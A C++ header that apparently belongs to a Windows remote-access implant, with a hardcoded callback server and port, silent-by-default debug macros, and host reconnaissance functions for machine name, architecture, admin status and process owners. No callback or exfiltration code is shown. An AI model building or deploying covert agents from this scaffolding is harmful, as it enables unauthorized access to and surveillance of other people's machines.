#pragma once

#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <sstream>
#include <memory>
#include <vector>
#include <iomanip>
#include <winnt.h>
#include <tlhelp32.h>

// ==============================
// === Config / Global Macros ===
// ==============================

// Toggle VERBOSE to 1 for debug output, 0 for silent operation
#ifndef VERBOSE
#define VERBOSE 0
#endif

#if VERBOSE
#define PRINTF(f_, ...) printf((f_), ##__VA_ARGS__)
#define WPRINTF(f_, ...) wprintf((f_), ##__VA_ARGS__)
#else
#define PRINTF(f_, ...)
#define WPRINTF(f_, ...)
#endif

// ==============================
// ====== Global Constants ======
// ==============================

#define SERVER "100.65.7.205"   // Change if needed
#define PORT 5000

// ==============================
// ===== Utility Functions ======
// ==============================

// Get the hostname of the machine
BOOL GetHost(std::string& host) {
	DWORD hostSize = 255;
	char hhost[256] = "";
	BOOL ret = GetComputerNameA(hhost, &hostSize);
	host = hhost;
	if (!ret) {
		PRINTF("[!] GetComputerNameA failed. Error: %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

// Get the architecture of the current process
std::string GetArch() {
	BOOL bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &bIsWow64);

	if (bIsWow64) {
		return "SysWow64";
	}

	SYSTEM_INFO sysInfo;
	ZeroMemory(&sysInfo, sizeof(SYSTEM_INFO));
	GetNativeSystemInfo(&sysInfo);

	switch (sysInfo.wProcessorArchitecture) {
	case PROCESSOR_ARCHITECTURE_AMD64:
		return "x64";
	case PROCESSOR_ARCHITECTURE_INTEL:
		return "x86";
	default:
		return "Unknown";
	}
}

// Get the architecture (x86/x64) of a process by PID
std::string getPIDArch(DWORD pid) {
	std::string arch = "N/A";
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (hProcess) {
		BOOL isWow64 = FALSE;
		if (IsWow64Process(hProcess, &isWow64)) {
			arch = isWow64 ? "x86" : "x64";
		}
		CloseHandle(hProcess);
	}

	return arch;
}

// Check if the current user is an Administrator
bool isUserAdmin() {
	BOOL isAdmin = FALSE;
	PSID adminGroupSid = NULL;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

	if (AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &adminGroupSid)) {

		CheckTokenMembership(NULL, adminGroupSid, &isAdmin);
		FreeSid(adminGroupSid);
	}

	return isAdmin == TRUE;
}

// Get the username for a process by PID (Admin required)
std::string getPIDUsername(DWORD pid) {
	std::string username = "";
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	HANDLE tokenHandle = NULL;

	if (!processHandle) {
		PRINTF("[-] Failed to open process with PID %d. Error: %d\n", pid, GetLastError());
		return username;
	}

	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle)) {
		PRINTF("[-] Failed to open token for PID %d. Error: %d\n", pid, GetLastError());
		CloseHandle(processHandle);
		return username;
	}

	DWORD tokenInfoLength = 0;
	GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &tokenInfoLength);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		PRINTF("[-] Failed to get token info length. PID %d. Error: %d\n", pid, GetLastError());
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return username;
	}

	std::unique_ptr<BYTE[]> tokenInfoBuffer(new BYTE[tokenInfoLength]);
	if (!GetTokenInformation(tokenHandle, TokenUser, tokenInfoBuffer.get(), tokenInfoLength, &tokenInfoLength)) {
		PRINTF("[-] Failed to get token information. PID %d. Error: %d\n", pid, GetLastError());
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return username;
	}

	PTOKEN_USER tokenUser = reinterpret_cast<PTOKEN_USER>(tokenInfoBuffer.get());
	DWORD nameSize = 0, domainSize = 0;
	SID_NAME_USE sidType;

	LookupAccountSidA(NULL, tokenUser->User.Sid, NULL, &nameSize, NULL, &domainSize, &sidType);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		PRINTF("[-] Failed to get account SID size. PID %d. Error: %d\n", pid, GetLastError());
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return username;
	}

	std::unique_ptr<char[]> nameBuffer(new char[nameSize]);
	std::unique_ptr<char[]> domainBuffer(new char[domainSize]);

	if (LookupAccountSidA(NULL, tokenUser->User.Sid,
		nameBuffer.get(), &nameSize,
		domainBuffer.get(), &domainSize, &sidType)) {

		username = std::string(domainBuffer.get()) + "\\" + std::string(nameBuffer.get());
	}
	else {
		PRINTF("[-] Failed to lookup account SID. PID %d. Error: %d\n", pid, GetLastError());
	}

	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	return username;
}
